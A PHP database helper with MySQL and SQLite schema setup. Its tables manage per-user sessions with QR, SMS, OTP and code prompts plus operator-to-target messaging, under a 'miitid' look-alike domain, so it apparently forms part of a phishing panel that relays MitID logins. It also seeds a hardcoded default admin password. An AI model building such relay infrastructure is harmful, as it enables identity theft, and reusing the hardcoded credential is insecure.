<?php
/**
 * Database Helper & PDO Connection Manager
 * 
 * Supports both MySQL (InfinityFree standard) and SQLite (automatic fallback)
 * Handles automatic schema initialization and initial seed data.
 */

date_default_timezone_set('UTC');

class DB {
    private static ?PDO $instance = null;
    private static string $activeDriver = 'mysql';

    public static function getConnection(): PDO {
        if (self::$instance !== null) {
            return self::$instance;
        }

        $config = require __DIR__ . '/config.php';
        $dbConfig = $config['db'];
        $driver = strtolower($dbConfig['driver'] ?? 'mysql');

        if ($driver === 'mysql') {
            try {
                if (!empty($dbConfig['auto_sqlite_fallback']) && in_array($dbConfig['host'], ['localhost', '127.0.0.1', '::1'], true)) {
                    $s = @fsockopen($dbConfig['host'], $dbConfig['port'], $errno, $errstr, 0.05);
                    if (!$s) {
                        throw new PDOException("MySQL port {$dbConfig['port']} unreachable on {$dbConfig['host']}");
                    }
                    fclose($s);
                }

                $dsn = sprintf(
                    "mysql:host=%s;port=%d;dbname=%s;charset=%s",
                    $dbConfig['host'],
                    $dbConfig['port'],
                    $dbConfig['database'],
                    $dbConfig['charset'] ?? 'utf8mb4'
                );

                $pdo = new PDO($dsn, $dbConfig['username'], $dbConfig['password'], [
                    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                    PDO::ATTR_EMULATE_PREPARES => false,
                    PDO::ATTR_TIMEOUT => 10,
                ]);

                try {
                    @$pdo->exec("SET time_zone = '+00:00';");
                } catch (Throwable $tzErr) {
                    // Ignore if host restricts time_zone
                }

                self::$instance = $pdo;
                self::$activeDriver = 'mysql';
                try {
                    $pdo->query("SELECT 1 FROM `sessions` LIMIT 1");
                } catch (Throwable $e) {
                    self::initSchema($pdo, 'mysql', $config);
                }
                return self::$instance;
            } catch (PDOException $e) {
                if (empty($dbConfig['auto_sqlite_fallback'])) {
                    throw $e;
                }
                // Fallback to SQLite if MySQL connection fails
                error_log("MySQL connection failed ({$e->getMessage()}). Falling back to SQLite.");
            }
        }

        // SQLite connection fallback
        try {
            $sqlitePath = $dbConfig['sqlite_path'] ?? (__DIR__ . '/../data/mitid.sqlite');
            $sqliteDir = dirname($sqlitePath);
            if (!is_dir($sqliteDir)) {
                @mkdir($sqliteDir, 0755, true);
            }

            $pdo = new PDO("sqlite:" . $sqlitePath, null, null, [
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                PDO::ATTR_TIMEOUT => 5,
            ]);

            // Enable foreign keys, WAL mode, and normal synchronous in SQLite
            $pdo->exec("PRAGMA foreign_keys = ON;");
            $pdo->exec("PRAGMA journal_mode = WAL;");
            $pdo->exec("PRAGMA synchronous = NORMAL;");

            self::$instance = $pdo;
            self::$activeDriver = 'sqlite';
            try {
                $pdo->query("SELECT 1 FROM sessions LIMIT 1");
            } catch (Throwable $e) {
                self::initSchema($pdo, 'sqlite', $config);
            }
            return self::$instance;
        } catch (Throwable $sqliteErr) {
            $mysqlErrStr = isset($e) ? $e->getMessage() : 'driver unavailable';
            throw new Exception("Database connection failed. MySQL error: {$mysqlErrStr}. SQLite fallback: {$sqliteErr->getMessage()}. Please run install.php or configure MySQL credentials in config/config.php.");
        }
    }

    public static function getDriver(): string {
        return self::$activeDriver;
    }

    private static function initSchema(PDO $pdo, string $driver, array $config): void {
        if ($driver === 'mysql') {
            $pdo->exec("CREATE TABLE IF NOT EXISTS `sessions` (
                `id` INT AUTO_INCREMENT PRIMARY KEY,
                `session_id` VARCHAR(64) NOT NULL UNIQUE,
                `user_id` VARCHAR(128) NOT NULL,
                `status` VARCHAR(32) DEFAULT 'pending',
                `qr_visible` TINYINT(1) DEFAULT 0,
                `qr_image` LONGTEXT NULL,
                `sms_active` TINYINT(1) DEFAULT 0,
                `otp_active` TINYINT(1) DEFAULT 0,
                `kode_active` TINYINT(1) DEFAULT 0,
                `verification_code` VARCHAR(10) NULL,
                `verified_at` DATETIME NULL,
                `created_at` DATETIME DEFAULT CURRENT_TIMESTAMP,
                `updated_at` DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
                INDEX `idx_session_id` (`session_id`),
                INDEX `idx_status` (`status`)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;");

            $pdo->exec("CREATE TABLE IF NOT EXISTS `auth_log` (
                `id` INT AUTO_INCREMENT PRIMARY KEY,
                `session_id` VARCHAR(64) NOT NULL,
                `event_type` VARCHAR(64) NOT NULL,
                `detail` TEXT NULL,
                `created_at` DATETIME DEFAULT CURRENT_TIMESTAMP,
                INDEX `idx_log_session` (`session_id`),
                INDEX `idx_created_at` (`created_at`),
                CONSTRAINT `fk_auth_log_session` FOREIGN KEY (`session_id`) REFERENCES `sessions` (`session_id`) ON DELETE CASCADE
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;");

            $pdo->exec("CREATE TABLE IF NOT EXISTS `admins` (
                `id` INT AUTO_INCREMENT PRIMARY KEY,
                `email` VARCHAR(255) NOT NULL UNIQUE,
                `password_hash` VARCHAR(255) NOT NULL,
                `created_at` DATETIME DEFAULT CURRENT_TIMESTAMP
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;");

            $pdo->exec("CREATE TABLE IF NOT EXISTS `ws_messages` (
                `id` INT AUTO_INCREMENT PRIMARY KEY,
                `session_id` VARCHAR(64) NOT NULL,
                `sender_role` VARCHAR(16) NOT NULL,
                `target_role` VARCHAR(16) NOT NULL,
                `message` LONGTEXT NOT NULL,
                `created_at` DATETIME DEFAULT CURRENT_TIMESTAMP,
                INDEX `idx_poll` (`session_id`, `target_role`, `id`),
                INDEX `idx_ws_created` (`created_at`),
                CONSTRAINT `fk_ws_messages_session` FOREIGN KEY (`session_id`) REFERENCES `sessions` (`session_id`) ON DELETE CASCADE
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;");

            $pdo->exec("CREATE TABLE IF NOT EXISTS `audit_log` (
                `id` INT AUTO_INCREMENT PRIMARY KEY,
                `session_id` VARCHAR(64) NULL,
                `actor` VARCHAR(32) NOT NULL,
                `event_type` VARCHAR(64) NOT NULL,
                `detail` TEXT NULL,
                `ip` VARCHAR(64) NULL,
                `created_at` DATETIME DEFAULT CURRENT_TIMESTAMP,
                INDEX `idx_audit_created` (`created_at`),
                INDEX `idx_audit_session` (`session_id`)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;");
        } else {
            // SQLite schema
            $pdo->exec("
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id VARCHAR(64) UNIQUE NOT NULL,
                    user_id VARCHAR(128) NOT NULL,
                    status VARCHAR(32) DEFAULT 'pending',
                    qr_visible INTEGER DEFAULT 0,
                    qr_image TEXT,
                    sms_active INTEGER DEFAULT 0,
                    otp_active INTEGER DEFAULT 0,
                    kode_active INTEGER DEFAULT 0,
                    verification_code VARCHAR(10),
                    verified_at DATETIME,
                    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
                );

                CREATE TABLE IF NOT EXISTS auth_log (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id VARCHAR(64) NOT NULL,
                    event_type VARCHAR(64) NOT NULL,
                    detail TEXT,
                    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (session_id) REFERENCES sessions(session_id) ON DELETE CASCADE
                );

                CREATE TABLE IF NOT EXISTS admins (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email VARCHAR(255) UNIQUE NOT NULL,
                    password_hash VARCHAR(255) NOT NULL,
                    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
                );

                CREATE TABLE IF NOT EXISTS ws_messages (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id VARCHAR(64) NOT NULL,
                    sender_role VARCHAR(16) NOT NULL,
                    target_role VARCHAR(16) NOT NULL,
                    message TEXT NOT NULL,
                    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (session_id) REFERENCES sessions(session_id) ON DELETE CASCADE
                );

                CREATE TABLE IF NOT EXISTS audit_log (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id VARCHAR(64),
                    actor VARCHAR(32) NOT NULL,
                    event_type VARCHAR(64) NOT NULL,
                    detail TEXT,
                    ip VARCHAR(64),
                    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
                );

                CREATE INDEX IF NOT EXISTS idx_sessions_sid ON sessions(session_id);
                CREATE INDEX IF NOT EXISTS idx_auth_log_sid ON auth_log(session_id);
                CREATE INDEX IF NOT EXISTS idx_ws_poll ON ws_messages(session_id, target_role, id);
                CREATE INDEX IF NOT EXISTS idx_ws_created ON ws_messages(created_at);
                CREATE INDEX IF NOT EXISTS idx_audit_created ON audit_log(created_at);
                CREATE INDEX IF NOT EXISTS idx_audit_session ON audit_log(session_id);
            ");
        }

        // Seed default admin account if table is empty
        $stmt = $pdo->query("SELECT COUNT(*) as cnt FROM admins");
        $count = (int)($stmt->fetchColumn() ?: 0);
        if ($count === 0) {
            $defaultEmail = $config['admin']['default_email'] ?? 'admin@miitid.com';
            $defaultPass = $config['admin']['default_password'] ?? 'Miitid@Admin2026!';
            $hash = password_hash($defaultPass, PASSWORD_BCRYPT);
            
            $insert = $pdo->prepare("INSERT INTO admins (email, password_hash) VALUES (?, ?)");
            $insert->execute([$defaultEmail, $hash]);
        }
    }
}
